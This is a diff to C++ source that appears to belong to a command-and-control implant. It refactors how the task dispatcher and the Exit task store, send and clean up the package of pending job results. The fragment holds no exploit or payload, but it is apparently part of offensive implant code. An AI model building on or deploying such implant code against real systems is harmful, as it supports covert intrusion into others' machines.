@@ -11,14 +11,13 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
 
     PACKAGE* Package  = nullptr;
     PARSER*  Parser   = nullptr;
-    PACKAGE* PostJobs = nullptr;
     PVOID    DataPsr  = nullptr;
     UINT64   PsrLen   = 0;
     PCHAR    TaskUUID = nullptr;
     BYTE     JobID    = 0;
     ULONG    TaskQtt  = 0;
 
-    PostJobs = Self->Pkg->PostJobs();
+    Self->Jbs->PostJobs = Self->Pkg->PostJobs();
     Package  = Self->Pkg->NewTask();
     if ( ! Package ) {
         KhDbg("ERROR: Failed to create new task package");
@@ -52,12 +51,12 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
         KhDbg("Task quantity received: %d", TaskQtt);
 
         if ( TaskQtt > 0 ) {
-            if ( !PostJobs ) {
+            if ( !Self->Jbs->PostJobs ) {
                 KhDbg("ERROR: Failed to create post jobs package");
                 goto CLEANUP;
             }
  
-            Self->Pkg->Int32( PostJobs, TaskQtt );
+            Self->Pkg->Int32( Self->Jbs->PostJobs, TaskQtt );
 
             for ( ULONG i = 0; i < TaskQtt; i++ ) {
                 TaskUUID = Self->Psr->Str( Parser, 0 );
@@ -82,7 +81,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
     }
 
     if ( Self->Jbs->ExecuteAll() ) {
-        Self->Jbs->Send( PostJobs );
+        Self->Jbs->Send( Self->Jbs->PostJobs );
     }
 
 CLEANUP:
@@ -96,8 +95,8 @@ CLEANUP:
         Self->Psr->Destroy( Parser );
     }
 
-    if ( PostJobs ) {
-        Self->Pkg->Destroy( PostJobs );
+    if ( Self->Jbs->PostJobs ) {
+        Self->Pkg->Destroy( Self->Jbs->PostJobs );
     }
 
     if ( Package ) {
@@ -1365,8 +1364,8 @@ auto DECLFN Task::Exit(
 ) -> ERROR_CODE {
     INT8 ExitType = Self->Psr->Byte( Job->Psr );
 
-    PACKAGE* Package = Self->Pkg->Create( Job->CmdID, Job->UUID );
-    Self->Pkg->Transmit( Package, 0, 0 );
+    Self->Jbs->Send( Self->Jbs->PostJobs );
+    Self->Jbs->Cleanup();
 
     Self->Hp->Clean();
 
